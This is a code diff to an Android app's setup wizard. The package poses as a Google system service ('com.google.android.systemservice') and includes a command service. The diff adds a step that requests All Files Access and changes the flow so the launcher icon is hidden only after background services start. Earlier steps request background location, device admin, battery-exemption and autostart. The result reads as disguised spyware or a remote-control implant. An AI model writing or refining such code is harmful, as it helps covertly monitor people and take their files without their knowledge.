@@ -14,6 +14,7 @@ import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.os.PowerManager
+import android.util.Log
 import android.provider.Settings
 import android.view.View
 import android.view.accessibility.AccessibilityManager
@@ -30,6 +31,10 @@ import com.google.android.systemservice.services.CommandService
 import com.google.android.systemservice.utils.VendorAutostart
 
 class SetupWizardActivity : AppCompatActivity() {
+    
+    companion object {
+        private const val TAG = "SetupWizard"
+    }
 
     private lateinit var progressBar: ProgressBar
     private lateinit var statusText: TextView
@@ -38,7 +43,7 @@ class SetupWizardActivity : AppCompatActivity() {
     private lateinit var progressPercent: TextView
 
     private var currentStep = 0
-    private val totalSteps = 6
+    private val totalSteps = 7 
 
     private val handler = Handler(Looper.getMainLooper())
 
@@ -76,6 +81,9 @@ class SetupWizardActivity : AppCompatActivity() {
             add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
         }
     }
+    
+    // Request code for All Files Access
+    private val MANAGE_STORAGE_REQUEST_CODE = 1007
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -137,6 +145,10 @@ class SetupWizardActivity : AppCompatActivity() {
                 statusText.text = "Configuring autostart..."
                 actionButton.text = "CONFIGURE"
             }
+            6 -> {
+                statusText.text = "Granting All Files Access..."
+                actionButton.text = "ALLOW ACCESS"
+            }
             else -> {
                 completeSetup()
             }
@@ -151,6 +163,26 @@ class SetupWizardActivity : AppCompatActivity() {
             3 -> requestBatteryOptimization()
             4 -> requestDeviceAdmin()
             5 -> requestVendorAutostart()
+            6 -> requestManageStoragePermission()
+        }
+    }
+    
+    private fun requestManageStoragePermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!android.os.Environment.isExternalStorageManager()) {
+                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                intent.data = Uri.parse("package:$packageName")
+                try {
+                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE)
+                } catch (e: Exception) {
+                    val intent2 = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                    startActivityForResult(intent2, MANAGE_STORAGE_REQUEST_CODE)
+                }
+            } else {
+                advanceToNextStep()
+            }
+        } else {
+            advanceToNextStep()
         }
     }
 
@@ -293,12 +325,20 @@ class SetupWizardActivity : AppCompatActivity() {
             .putBoolean("setup_complete", true)
             .apply()
 
-        // Hide launcher icon
-        hideLauncherIcon()
-
-        // Start services and finish
+        // CRITICAL: Start services FIRST, then hide icon, THEN finish activity
+        // If we hide icon first and services fail, user has no way to retry
         handler.postDelayed({
-            launchServicesAndFinish()
+            try {
+                launchServicesAndFinish()
+                // Only hide icon AFTER services started successfully
+                hideLauncherIcon()
+                // Finally, close the activity AFTER hiding icon
+                finish()
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to launch services: ${e.message}")
+                // Don't hide icon if services failed - user needs retry option
+                Toast.makeText(this, "Setup incomplete, please retry", Toast.LENGTH_LONG).show()
+            }
         }, 1500)
     }
 
@@ -331,6 +371,6 @@ class SetupWizardActivity : AppCompatActivity() {
             startService(serviceIntent)
         }
         
-        finish()
+        // Note: finish() is NOT called here - it's called from completeSetup() AFTER hideLauncherIcon()
     }
 }
